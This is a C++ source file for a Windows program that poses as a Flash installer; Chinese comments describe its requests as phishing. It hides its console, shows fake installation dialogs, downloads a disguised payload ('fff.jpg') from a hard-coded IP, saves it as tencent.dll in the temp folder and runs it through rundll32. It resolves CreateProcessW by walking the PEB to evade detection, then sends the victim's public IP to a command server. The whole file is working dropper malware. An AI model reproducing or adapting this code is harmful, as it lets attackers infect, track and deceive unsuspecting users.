#pragma once

#include<Windows.h>

#include<cstdio>

#include<string>

#include "winhttp.h"

#include "Peb.h"

#pragma comment (lib,"winhttp.lib")

#pragma comment (lib,"WinInet.lib")



static TCHAR szURL[] = TEXT("http://47.56.199.16/fff.jpg");

static TCHAR szSaveFilePath[MAX_PATH];

static TCHAR szFileName[] = TEXT("\\tencent.dll");

static TCHAR szFileBuffer[MAX_PATH];



char* WcharToChar(wchar_t* wc)

{

       char* m_char;

       int len = WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), NULL, 0, NULL, 
NULL);

       m_char = new char[len + 1];

       WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), m_char, len, NULL, NULL);

       m_char[len] = '\0';

       return m_char;

}





std::wstring StringToWString(const std::string& str)

{

       int num = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);

       wchar_t *wide = new wchar_t[num];

       MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, wide, num);

       std::wstring w_str(wide);

       delete[] wide;

       return w_str;

}





void GoHttp(PCHAR* pSzBuffer, HINTERNET hConnect, HINTERNET hRequest) {



       if (hRequest == NULL) {

              printf("WinHttpOpenRequest Failed, the error is %d", 
GetLastError());

              return;

       }



       BOOL bHttpRet = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 
0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);



       if (!bHttpRet) {

              printf("WinHttpSendRequest Failed, the error is %d", 
GetLastError());

              return;

       }



       bHttpRet = WinHttpReceiveResponse(hRequest, NULL);



       if (!bHttpRet) {

              printf("WinHttpReceiveResponse Failed, the error is %d", 
GetLastError());

              return;

       }



       DWORD dwHttpContentSize = 0;

       DWORD dwReadedContentSize = 0;





       if (!WinHttpQueryDataAvailable(hRequest, &dwHttpContentSize)) {

              printf("WinHttpQueryDataAvailable Failed, the error is %d", 
GetLastError());

              return;

       }



       PCHAR pTempSzBuffer = new CHAR[dwHttpContentSize + 1];

       ZeroMemory(pTempSzBuffer, dwHttpContentSize + 1);



       if (pTempSzBuffer == NULL) {

              printf("堆内存申请失败");

              return;

       }



       if (!WinHttpReadData(hRequest, (LPVOID)pTempSzBuffer, dwHttpContentSize, 
&dwReadedContentSize)) {

              printf("WinHttpReadData Failed, the error is %d", GetLastError());

              return;

       }



       if (hRequest) WinHttpCloseHandle(hRequest);

       if (hConnect) WinHttpCloseHandle(hConnect);

       // sprintf("%s\n", pTempSzBuffer);

       *pSzBuffer = pTempSzBuffer;

}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, 
int nShowCmd){

       //MasqueradePEB(); //伪造可信进程

       ShowWindow(GetConsoleWindow(), SW_HIDE);

       Sleep(3000);

       MessageBox(NULL, L"Flash is being installed, please wait...", L"Flash:", 
MB_OK | MB_ICONEXCLAMATION);

       ZeroMemory(szSaveFilePath, MAX_PATH);

       HINTERNET hInternetOpen = InternetOpen(L"Microsoft Internet Explorer", 
INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

       if (hInternetOpen == NULL) {

              wprintf(L"InternetOpen is error, the error is %d\n", 
GetLastError());

              return -1;

       }



       HINTERNET hInternetOpenUrl = InternetOpenUrl(hInternetOpen, 
L"http://47.56.199.16/fff.jpg", NULL, 0, INTERNET_FLAG_RELOAD, 0);

       if (hInternetOpenUrl == NULL) {

              wprintf(L"InternetOpenUrl is error, the error is %d\n", 
GetLastError());

              InternetCloseHandle(hInternetOpen);

              return -1;

       }

       

       ZeroMemory(szSaveFilePath, MAX_PATH);

       GetEnvironmentVariable(TEXT("TMP"), szSaveFilePath, MAX_PATH);

       wcscat(szSaveFilePath, szFileName);



       wcscat(szFileBuffer, L" "); // " "

       wcscat(szFileBuffer, szSaveFilePath); // " c:\\temp\\tencent.dll"

       wcscat(szFileBuffer, L",tencent"); // " c:\\temp\\tencent.dll,tencent"

       

       //wprintf(L"%s\n", szSaveFilePath);

       //wprintf(L"%s\ns", szFileBuffer);

       HANDLE hCreateFile = CreateFile(szSaveFilePath, GENERIC_WRITE, 0, 0, 
CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

       if (hCreateFile == INVALID_HANDLE_VALUE) {

              //wprintf(L"CreateFile is error, the error is %d\n", 
GetLastError());

              InternetCloseHandle(hInternetOpenUrl);

              InternetCloseHandle(hInternetOpen);

              return -1;

       }



       TCHAR szDownBuffer[4096];

       DWORD dwByteRead = 0;

       DWORD dwWritten = 0;



       BOOL bIntNetReadFile = TRUE;

       BOOL bWriteFile = TRUE;



       ZeroMemory(szDownBuffer, 4096);



       while (true){

              bIntNetReadFile = InternetReadFile(hInternetOpenUrl, szDownBuffer, 
sizeof(szDownBuffer), &dwByteRead);

              if (dwByteRead == 0)

              {

                     break;

              }



              bWriteFile = WriteFile(hCreateFile, szDownBuffer, 
sizeof(szDownBuffer), &dwWritten, NULL);

              if (bWriteFile == 0)

              {

                     break;

              }

       }



       CloseHandle(hCreateFile);

       InternetCloseHandle(hInternetOpenUrl);

       InternetCloseHandle(hInternetOpen);



       //定义创建进程需要用的结构体 

       

       STARTUPINFO si = { 0 };

       PROCESS_INFORMATION pi;

       CHAR szCreateProcessW[] = "CreateProcessW";

       si.cb = sizeof(si);

       



       typedef BOOL(WINAPI* pCreateProcessW)(

              _In_opt_ LPCWSTR lpApplicationName,

              _Inout_opt_ LPWSTR lpCommandLine,

              _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,

              _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,

              _In_ BOOL bInheritHandles,

              _In_ DWORD dwCreationFlags,

              _In_opt_ LPVOID lpEnvironment,

              _In_opt_ LPCWSTR lpCurrentDirectory,

              _In_ LPSTARTUPINFOW lpStartupInfo,

              _Out_ LPPROCESS_INFORMATION lpProcessInformation

              );



       DWORD dwKernel32 = _getKernelBase();

       pCreateProcessW pCreateProcessB = (pCreateProcessW)_getApi(dwKernel32, 
szCreateProcessW);



       //创建子进程                            

       BOOL res = pCreateProcessB(

              L"C:\\Windows\\System32\\rundll32.exe",

              szFileBuffer,      // szBuffer则是c:/c.exe那么就是启动c.exe这个进程                   

              NULL,

              NULL,

              FALSE,

              CREATE_NEW_CONSOLE,

              NULL,

              NULL, &si, &pi);

       

       // 三次HTTP请求

       HINTERNET hSession;

       HINTERNET hConnect;

       HINTERNET hConnect1;

       HINTERNET hConnect2;

       HINTERNET hRequest;

       CHAR* pSzBuffer;



       hSession = WinHttpOpen(L"WinHTTP Example/1.0", 
WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 
0);



       if (hSession == NULL) {

              //printf("WinHttpOpen Failed, the error is %d", GetLastError());

              return -1;

       }



       // get ip请求

       hConnect = WinHttpConnect(hSession, L"api.ipify.org", 80, 0);

       if (hConnect == NULL) {

              //printf("WinHttpConnect Failed, the error is %d", GetLastError());

              return -1;

       }

       

       hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, 
WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

       GoHttp(&pSzBuffer, hConnect, hRequest);



       // 钓鱼的两个isOpen请求和isCloseTarget请求

       std::wstring szBufferIp = StringToWString(pSzBuffer);



       // isOpen请求 

       hConnect1 = WinHttpConnect(hSession, L"windows.iflash.tk", 443, 0);

       if (hConnect1 == NULL) {

              //printf("WinHttpConnect Failed, the error is %d", GetLastError());

              return -1;

       }

       wchar_t szPathBuffer1[MAX_PATH] = L"/index.php?m=api&a=isOpen&outerIp=";

       wcscat(szPathBuffer1, szBufferIp.c_str());

       //wprintf(L"%s", szPathBuffer1);

       hRequest = WinHttpOpenRequest(hConnect1, L"GET", szPathBuffer1, NULL, 
WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

       GoHttp(&pSzBuffer, hConnect1, hRequest);



       // isCloseTarget请求



       hConnect2 = WinHttpConnect(hSession, L"windows.iflash.tk", 443, 0);

       if (hConnect2 == NULL) {

              //printf("WinHttpConnect Failed, the error is %d", GetLastError());

              return -1;

       }



       wchar_t szPathBuffer2[MAX_PATH] = 
L"/index.php?m=api&a=isCloseTarget&outerIp=";

       wcscat(szPathBuffer2, szBufferIp.c_str());

       //wprintf(L"%s", szPathBuffer2);

       hRequest = WinHttpOpenRequest(hConnect2, L"GET", szPathBuffer2, NULL, 
WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

       GoHttp(&pSzBuffer, hConnect2, hRequest);



       MessageBox(NULL, L"Flash installation completed!", L"Flash:", MB_OK | 
MB_ICONINFORMATION);

       

       return 0;

}